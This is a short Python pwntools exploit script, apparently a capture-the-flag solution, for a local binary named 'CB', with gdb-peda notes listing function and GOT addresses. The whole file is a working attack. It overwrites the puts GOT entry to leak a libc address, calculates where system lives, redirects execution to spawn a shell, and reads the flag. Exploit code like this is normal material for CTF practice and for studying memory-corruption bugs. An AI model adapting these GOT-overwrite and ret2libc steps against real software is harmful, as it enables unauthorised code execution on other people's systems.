from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')

'''
gdb-peda$ p info
$1 = {<text variable, no debug info>} 0x80485e5 <info>
gdb-peda$ p puts
$2 = {<text variable, no debug info>} 0x8048460 <puts@plt>
gdb-peda$ x/i puts
   0x8048460 <puts@plt>:	jmp    DWORD PTR ds:0x804a020
'''

info = 0x8048615
got_puts = 0x804a020

def go(n, st='4. info\n'):
	s.recvuntil(st)
	s.sendline(str(n))

go(14831)
go('test', 'name:')
go('1', 'age :')

go(1383) # del
go(172903)
s.send(p32(got_puts)+p32(info))
go(4)

leak_puts = u32(s.recv(4))
leak_system = leak_puts-libc.symbols['puts']+libc.symbols['system']
go(1383) # del
go(172903)
s.send('sh\x00\x00'+p32(leak_system))
go(4)

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()